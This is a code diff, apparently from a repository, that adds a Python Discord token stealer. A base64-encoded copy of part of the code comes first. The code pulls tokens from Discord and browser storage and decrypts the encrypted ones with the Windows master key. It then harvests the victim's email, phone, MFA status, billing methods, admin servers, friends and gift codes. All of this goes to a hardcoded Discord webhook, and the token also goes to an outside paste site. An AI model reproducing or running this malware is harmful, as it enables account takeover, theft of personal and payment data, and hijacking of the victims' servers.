gICAgICAgIGlmIGFkbWluIGFuZCBndWlsZFsnYXBwcm94aW1hdGVfbWVtYmVyX2NvdW50J10gPj0gMTAwOgogICAgICAgICAgICAgICAgICAgICAgICBvd25lciA9ICLinIUiIGlmIGd1aWxkWydvd25lciddIGVsc2UgIuKdjCIKCiAgICAgICAgICAgICAgICAgICAgICAgIGludml0ZXMgPSByZXF1ZXN0cy5nZXQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y4L2d1aWxkcy97Z3VpbGRbJ2lkJ119L2ludml0ZXMiLCBoZWFkZXJzPXsnQXV0aG9yaXphdGlvbic6IHRva2VufSkuanNvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbihpbnZpdGVzKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnZpdGUgPSBmImh0dHBzOi8vZGlzY29yZC5nZy97aW52aXRlc1swXVsnY29kZSddfSIKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludml0ZSA9ICJodHRwczovL3lvdXR1LmJlL2RRdzR3OVdnWGNRIgoKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IGYiXHUyMDBiXG4qKntndWlsZFsnbmFtZSddfSAoe2d1aWxkWydpZCddfSkqKiBcbiBPd25lcjogYHtvd25lcn1gIHwgTWVtYmVyczogYCDimqsge2d1aWxkWydhcHByb3hpbWF0ZV9tZW1iZXJfY291bnQnXX0gLyDwn5+iIHtndWlsZFsnYXBwcm94aW1hdGVfcHJlc2VuY2VfY291bnQnXX0gLyDwn5S0IHtndWlsZFsnYXBwcm94aW1hdGVfbWVtYmVyX2NvdW50J10gLSBndWlsZFsnYXBwcm94aW1hdGVfcHJlc2VuY2VfY291bnQnXX0gYFxuW0pvaW4gU2VydmVyXSh7aW52aXRlfSkiCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oJ1xuJy5qb2luKGhxX2d1aWxkcykpICsgbGVuKGRhdGEpID49IDEwMjQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawoKICAgICAgICAgICAgICAgICAgICAgICAgaHFfZ3VpbGRzLmFwcGVuZChkYXRhKQoKICAgICAgICAgICAgICAgIGlmIGxlbihocV9ndWlsZHMpID4gMDoKICAgICAgICAgICAgICAgICAgICBocV9ndWlsZHMgPSAnXG4nLmpvaW4oaHFfZ3VpbGRzKQoKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgaHFfZ3VpbGRzID0gTm9uZQoKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGhxX2d1aWxkcyA9IE5vbmUKCiAgICAgICAgICAgIGlmIGZyaWVuZHM6CiAgICAgICAgICAgICAgICBocV9mcmllbmRzID0gW10KICAgICAgICAgICAgICAgIGZvciBmcmllbmQgaW4gZnJpZW5kczoKICAgICAgICAgICAgICAgICAgICB1bnByZWZlcmVkX2ZsYWdzID0gWzY0LCAxMjgsIDI1NiwgMTA0ODcwNF0KICAgICAgICAgICAgICAgICAgICBpbmRzID0gW2ZsYWdbMV0gZm9yIGZsYWcgaW4gc2VsZi5jYWxjX2ZsYWdzKAogICAgICAgICAgICAgICAgICAgICAgICBmcmllbmRbJ3VzZXInXVsncHVibGljX2ZsYWdzJ10pWzo6LTFdXQogICAgICAgICAgICAgICAgICAgIGZvciBmbGFnIGluIHVucHJlZmVyZWRfZmxhZ3M6CiAgICAgICAgICAgICAgICAgICAgICAgIGluZHMucmVtb3ZlKGZsYWcpIGlmIGZsYWcgaW4gaW5kcyBlbHNlIE5vbmUKICAgICAgICAgICAgICAgICAgICBpZiBpbmRzICE9IFtdOgogICAgICAgICAgICAgICAgICAgICAgICBocV9iYWRnZXMgPSAnICcuam9pbihbZmxhZ1swXSBmb3IgZmxhZyBpbiBzZWxmLmNhbGNfZmxhZ3MoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcmllbmRbJ3VzZXInXVsncHVibGljX2ZsYWdzJ10pWzo6LTFdXSkKCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSBmIntocV9iYWRnZXN9IC0gYHtmcmllbmRbJ3VzZXInXVsndXNlcm5hbWUnXX0je2ZyaWVuZFsndXNlciddWydkaXNjcmltaW5hdG9yJ119ICh7ZnJpZW5kWyd1c2VyJ11bJ2lkJ119KWAiCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oJ1xuJy5qb2luKGhxX2ZyaWVuZHMpKSArIGxlbihkYXRhKSA+PSAxMDI0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKCiAgICAgICAgICAgICAgICAgICAgICAgIGhxX2ZyaWVuZHMuYXBwZW5kKGRhdGEpCgogICAgICAgICAgICAgICAgaWYgbGVuKGhxX2ZyaWVuZHMpID4gMDoKICAgICAgICAgICAgICAgICAgICBocV9mcmllbmRzID0gJ1xuJy5qb2luKGhxX2ZyaWVuZHMpCgogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBocV9mcmllbmRzID0gTm9uZQoKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGhxX2ZyaWVuZHMgPSBOb25lCgogICAgICAgICAgICBpZiBnaWZ0X2NvZGVzOgogICAgICAgICAgICAgICAgY29kZXMgPSBbXQogICAgICAgICAgICAgICAgZm9yIGNvZGUgaW4gZ2lmdF9jb2RlczoKICAgICAgICAgICAgICAgICAgICBuYW1lID0gY29kZVsncHJvbW90aW9uJ11bJ291dGJvdW5kX3RpdGxlJ10KICAgICAgICAgICAgICAgICAgICBjb2RlID0gY29kZVsnY29kZSddCgogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBmIjpnaWZ0OiBge25hbWV9YFxuOnRpY2tldDogYHtjb2RlfWAiCgogICAgICAgICAgICAgICAgICAgIGlmIGxlbignXG5cbicuam9pbihjb2RlcykpICsgbGVuKGRhdGEpID49IDEwMjQ6CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCgogICAgICAgICAgICAgICAgICAgIGNvZGVzLmFwcGVuZChkYXRhKQoKICAgICAgICAgICAgICAgIGlmIGxlbihjb2RlcykgPiAwOgogICAgICAgICAgICAgICAgICAgIGNvZGVzID0gJ1xuXG4nLmpvaW4oY29kZXMpCgogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBjb2RlcyA9IE5vbmUKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBjb2RlcyA9IE5vbmUKCiAgICAgICAgICAgIGVtYmVkID0gRW1iZWQodGl0bGU9ZiJ7dXNlcm5hbWV9ICh7dXNlcl9pZH0pIiwgY29sb3I9MHgwMDAwMDApCiAgICAgICAgICAgIGVtYmVkLnNldF90aHVtYm5haWwodXJsPWF2YXRhcikKCiAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSI8YTpwaW5rY3Jvd246OTk2MDA0MjA5NjY3MzQ2NDQyPiBUb2tlbjoiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU9ZiJgYGB7dG9rZW59YGBgXG5bQ2xpY2sgdG8gY29weSFdKGh0dHBzOi8vcGFzdGUtcGdwai5vbnJlbmRlci5jb20vP3A9e3Rva2VufSlcblx1MjAwYiIsIGlubGluZT1GYWxzZSkKICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKAogICAgICAgICAgICAgICAgbmFtZT0iPGE6bml0cm9ib29zdDo5OTYwMDQyMTMzNTQxMzk2NTg+IE5pdHJvOiIsIHZhbHVlPWYie25pdHJvfSIsIGlubGluZT1UcnVlKQogICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iPGE6cmVkYm9vc3Q6OTk2MDA0MjMwMzQ1MjgxNTQ2PiBCYWRnZXM6IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlPWYie2JhZGdlcyBpZiBiYWRnZXMgIT0gJycgZWxzZSAnTm9uZSd9IiwgaW5saW5lPVRydWUpCiAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSI8YTpwaW5rbHY6OTk2MDA0MjIyMDkwODkxMzY2PiBCaWxsaW5nOiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZT1mIntwYXltZW50X21ldGhvZHMgaWYgcGF5bWVudF9tZXRob2RzICE9ICcnIGVsc2UgJ05vbmUnfSIsIGlubGluZT1UcnVlKQogICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iPDptZmE6MTAyMTYwNDkxNjUzNzYwMjA4OD4gTUZBOiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZT1mInttZmF9IiwgaW5saW5lPVRydWUpCgogICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iXHUyMDBiIiwgdmFsdWU9Ilx1MjAwYiIsIGlubGluZT1GYWxzZSkKCiAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSI8YTpyYWluYm93aGVhcnQ6OTk2MDA0MjI2MDkyMjQ1MDcyPiBFbWFpbDoiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWU9ZiJ7ZW1haWwgaWYgZW1haWwgIT0gTm9uZSBlbHNlICdOb25lJ30iLCBpbmxpbmU9VHJ1ZSkKICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9Ijw6c3RhcnhnbG93Ojk5NjAwNDIxNzY5OTQzNDQ5Nj4gUGhvbmU6IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlPWYie3Bob25lIGlmIHBob25lICE9IE5vbmUgZWxzZSAnTm9uZSd9IiwgaW5saW5lPVRydWUpCgogICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iXHUyMDBiIiwgdmFsdWU9Ilx1MjAwYiIsIGlubGluZT1GYWxzZSkKCiAgICAgICAgICAgIGlmIGhxX2d1aWxkcyAhPSBOb25lOgogICAgICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKAogICAgICAgICAgICAgICAgICAgIG5hbWU9IjxhOmVhcnRocGluazo5OTYwMDQyMzY1MzE4NTk1ODg+IEhRIEd1aWxkczoiLCB2YWx1ZT1ocV9ndWlsZHMsIGlubGluZT1GYWxzZSkKICAgICAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSJcdTIwMGIiLCB2YWx1ZT0iXHUyMDBiIiwgaW5saW5lPUZhbHNlKQoKICAgICAgICAgICAgaWYgaHFfZnJpZW5kcyAhPSBOb25lOgogICAgICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKAogICAgICAgICAgICAgICAgICAgIG5hbWU9IjxhOmVhcnRocGluazo5OTYwMDQyMzY1MzE4NTk1ODg+IEhRIEZyaWVuZHM6IiwgdmFsdWU9aHFfZnJpZW5kcywgaW5saW5lPUZhbHNlKQogICAgICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9Ilx1MjAwYiIsIHZhbHVlPSJcdTIwMGIiLCBpbmxpbmU9RmFsc2UpCgogICAgICAgICAgICBpZiBjb2RlcyAhPSBOb25lOgogICAgICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKAogICAgICAgICAgICAgICAgICAgIG5hbWU9IjxhOmdpZnQ6MTAyMTYwODQ3OTgwODU2OTQzNT4gR2lmdCBDb2RlczoiLCB2YWx1ZT1jb2RlcywgaW5saW5lPUZhbHNlKQogICAgICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9Ilx1MjAwYiIsIHZhbHVlPSJcdTIwMGIiLCBpbmxpbmU9RmFsc2UpCgogICAgICAgICAgICBzZWxmLndlYmhvb2suc2VuZChlbWJlZD1lbWJlZCwgdXNlcm5hbWU9Ik5HWCBCRVRBIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXZhdGFyX3VybD0iIikKICAgICAgICAgICAgCmlmICJfX21haW5fXyIgaW4gX19uYW1lX186CiAgICBEaXNjb3JkVG9rZW4oImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDE2OTYwMTgzMTI4NjM4MDQvWmdtRFNsYksyeE1wTlZUTWxQOVZjRkhPNzZZeXU4UjZFVHNYaEFSVXF4ekpqUUM2YkhRZFJUTVpIZ1lweG10TjAzVmQiKQ==
+import base64,json,os,re,requests
+
+from Crypto.Cipher import AES
+from discord import Embed, SyncWebhook
+from win32crypt import CryptUnprotectData
+
+class DiscordToken:
+    def __init__(self, webhook):
+        upload_tokens(webhook).upload()
+
+
+class extract_tokens:
+    def __init__(self) -> None:
+        self.base_url = "https://discord.com/api/v9/users/@me"
+        self.appdata = os.getenv("localappdata")
+        self.roaming = os.getenv("appdata")
+        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
+
+        self.tokens, self.uids = [], []
+
+        self.extract()
+
+    def extract(self) -> None:
+        paths = {
+            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
+            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
+            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
+            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
+            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
+            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
+            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
+            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
+            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
+            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
+            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
+            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
+        }
+
+        for name, path in paths.items():
+            if not os.path.exists(path):
+                continue
+            _discord = name.replace(" ", "").lower()
+            if "cord" in path:
+                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
+                    continue
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]:
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for y in re.findall(self.regexp_enc, line):
+                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
+                                                     1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
+
+                            if self.validate_token(token):
+                                uid = requests.get(self.base_url, headers={
+                                                   'Authorization': token}).json()['id']
+                                if uid not in self.uids:
+                                    self.tokens.append(token)
+                                    self.uids.append(uid)
+
+            else:
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]:
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(self.regexp, line):
+                            if self.validate_token(token):
+                                uid = requests.get(self.base_url, headers={
+                                                   'Authorization': token}).json()['id']
+                                if uid not in self.uids:
+                                    self.tokens.append(token)
+                                    self.uids.append(uid)
+
+        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
+                for _file in files:
+                    if not _file.endswith('.sqlite'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(self.regexp, line):
+                            if self.validate_token(token):
+                                uid = requests.get(self.base_url, headers={
+                                                   'Authorization': token}).json()['id']
+                                if uid not in self.uids:
+                                    self.tokens.append(token)
+                                    self.uids.append(uid)
+
+    def validate_token(self, token: str) -> bool:
+        print(token)
+        r = requests.get(self.base_url, headers={'Authorization': token})
+
+        if r.status_code == 200:
+            return True
+
+        return False
+
+    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+
+        return decrypted_pass
+
+    def get_master_key(self, path: str) -> str:
+        if not os.path.exists(path):
+            return
+
+        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
+            return
+
+        with open(path, "r", encoding="utf-8") as f:
+            c = f.read()
+        local_state = json.loads(c)
+
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+        return master_key
+
+
+class upload_tokens:
+    def __init__(self, webhook: str):
+        self.tokens = extract_tokens().tokens
+        self.webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1141696018312863804/ZgmDSlbK2xMpNVTMlP9VcFHO76Yyu8R6ETsXhARUqxzJjQC6bHQdRTMZHgYpxmtN03Vd")
+
+    def calc_flags(self, flags: int) -> list:
+        flags_dict = {
+            "DISCORD_EMPLOYEE": {
+                "emoji": "<:staff:968704541946167357>",
+                "shift": 0,
+                "ind": 1
+            },
+            "DISCORD_PARTNER": {
+                "emoji": "<:partner:968704542021652560>",
+                "shift": 1,
+                "ind": 2
+            },
+            "HYPESQUAD_EVENTS": {
+                "emoji": "<:hypersquad_events:968704541774192693>",
+                "shift": 2,
+                "ind": 4
+            },
+            "BUG_HUNTER_LEVEL_1": {
+                "emoji": "<:bug_hunter_1:968704541677723648>",
+                "shift": 3,
+                "ind": 4
+            },
+            "HOUSE_BRAVERY": {
+                "emoji": "<:hypersquad_1:968704541501571133>",
+                "shift": 6,
+                "ind": 64
+            },
+            "HOUSE_BRILLIANCE": {
+                "emoji": "<:hypersquad_2:968704541883261018>",
+                "shift": 7,
+                "ind": 128
+            },
+            "HOUSE_BALANCE": {
+                "emoji": "<:hypersquad_3:968704541874860082>",
+                "shift": 8,
+                "ind": 256
+            },
+            "EARLY_SUPPORTER": {
+                "emoji": "<:early_supporter:968704542126510090>",
+                "shift": 9,
+                "ind": 512
+            },
+            "BUG_HUNTER_LEVEL_2": {
+                "emoji": "<:bug_hunter_2:968704541774217246>",
+                "shift": 14,
+                "ind": 16384
+            },
+            "VERIFIED_BOT_DEVELOPER": {
+                "emoji": "<:verified_dev:968704541702905886>",
+                "shift": 17,
+                "ind": 131072
+            },
+            "ACTIVE_DEVELOPER": {
+                "emoji": "<:Active_Dev:1045024909690163210>",
+                "shift": 22,
+                "ind": 4194304
+            },
+            "CERTIFIED_MODERATOR": {
+                "emoji": "<:certified_moderator:988996447938674699>",
+                "shift": 18,
+                "ind": 262144
+            },
+            "SPAMMER": {
+                "emoji": "⌨",
+                "shift": 20,
+                "ind": 1048704
+            },
+        }
+
+        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
+
+    def upload(self):
+        if not self.tokens:
+            return
+
+        for token in self.tokens:
+            user = requests.get(
+                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
+            billing = requests.get(
+                'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
+            guilds = requests.get(
+                'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
+            friends = requests.get(
+                'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
+            gift_codes = requests.get(
+                'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
+
+            username = user['username'] + '#' + user['discriminator']
+            user_id = user['id']
+            email = user['email']
+            phone = user['phone']
+            mfa = user['mfa_enabled']
+            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(
+                f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
+            badges = ' '.join([flag[0]
+                              for flag in self.calc_flags(user['public_flags'])])
+
+            if user['premium_type'] == 0:
+                nitro = 'None'
+            elif user['premium_type'] == 1:
+                nitro = 'Nitro Classic'
+            elif user['premium_type'] == 2:
+                nitro = 'Nitro'
+            elif user['premium_type'] == 3:
+                nitro = 'Nitro Basic'
+            else:
+                nitro = 'None'
+
+            if billing:
+                payment_methods = []
+
+                for method in billing:
+                    if method['type'] == 1:
+                        payment_methods.append('💳')
+
+                    elif method['type'] == 2:
+                        payment_methods.append("<:paypal:973417655627288666>")
+
+                    else:
+                        payment_methods.append('❓')
+
+                payment_methods = ', '.join(payment_methods)
+
+            else:
+                payment_methods = None
+
+            if guilds:
+                hq_guilds = []
+                for guild in guilds:
+                    admin = True if guild['permissions'] == '4398046511103' else False
+                    if admin and guild['approximate_member_count'] >= 100:
+                        owner = "✅" if guild['owner'] else "❌"
+
+                        invites = requests.get(
+                            f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
+                        if len(invites) > 0:
+                            invite = f"https://discord.gg/{invites[0]['code']}"
+                        else:
+                            invite = "https://youtu.be/dQw4w9WgXcQ"
+
+                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
+
+                        if len('\n'.join(hq_guilds)) + len(data) >= 1024:
+                            break
+
+                        hq_guilds.append(data)
+
+                if len(hq_guilds) > 0:
+                    hq_guilds = '\n'.join(hq_guilds)
+
+                else:
+                    hq_guilds = None
+
+            else:
+                hq_guilds = None
+
+            if friends:
+                hq_friends = []
+                for friend in friends:
+                    unprefered_flags = [64, 128, 256, 1048704]
+                    inds = [flag[1] for flag in self.calc_flags(
+                        friend['user']['public_flags'])[::-1]]
+                    for flag in unprefered_flags:
+                        inds.remove(flag) if flag in inds else None
+                    if inds != []:
+                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
+                            friend['user']['public_flags'])[::-1]])
+
+                        data = f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`"
+
+                        if len('\n'.join(hq_friends)) + len(data) >= 1024:
+                            break
+
+                        hq_friends.append(data)
+
+                if len(hq_friends) > 0:
+                    hq_friends = '\n'.join(hq_friends)
+
+                else:
+                    hq_friends = None
+
+            else:
+                hq_friends = None
+
+            if gift_codes:
+                codes = []
+                for code in gift_codes:
+                    name = code['promotion']['outbound_title']
+                    code = code['code']
+
+                    data = f":gift: `{name}`\n:ticket: `{code}`"
+
+                    if len('\n\n'.join(codes)) + len(data) >= 1024:
+                        break
+
+                    codes.append(data)
+
+                if len(codes) > 0:
+                    codes = '\n\n'.join(codes)
+
+                else:
+                    codes = None
+
+            else:
+                codes = None
+
+            embed = Embed(title=f"{username} ({user_id})", color=0x000000)
+            embed.set_thumbnail(url=avatar)
+
+            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
+                            value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
+            embed.add_field(
+                name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
+            embed.add_field(name="<a:redboost:996004230345281546> Badges:",
+                            value=f"{badges if badges != '' else 'None'}", inline=True)
+            embed.add_field(name="<a:pinklv:996004222090891366> Billing:",
+                            value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
+            embed.add_field(name="<:mfa:1021604916537602088> MFA:",
+                            value=f"{mfa}", inline=True)
+
+            embed.add_field(name="\u200b", value="\u200b", inline=False)
+
+            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:",
+                            value=f"{email if email != None else 'None'}", inline=True)
+            embed.add_field(name="<:starxglow:996004217699434496> Phone:",
+                            value=f"{phone if phone != None else 'None'}", inline=True)
+
+            embed.add_field(name="\u200b", value="\u200b", inline=False)
+
+            if hq_guilds != None:
+                embed.add_field(
+                    name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
+                embed.add_field(name="\u200b", value="\u200b", inline=False)
+
+            if hq_friends != None:
+                embed.add_field(
+                    name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
+                embed.add_field(name="\u200b", value="\u200b", inline=False)
+
+            if codes != None:
+                embed.add_field(
+                    name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
+                embed.add_field(name="\u200b", value="\u200b", inline=False)
+
+            self.webhook.send(embed=embed, username="NGX BETA",
+                              avatar_url="")
+            
+if "__main__" in __name__:
+    DiscordToken("YOUR WEBHOOK LINK")
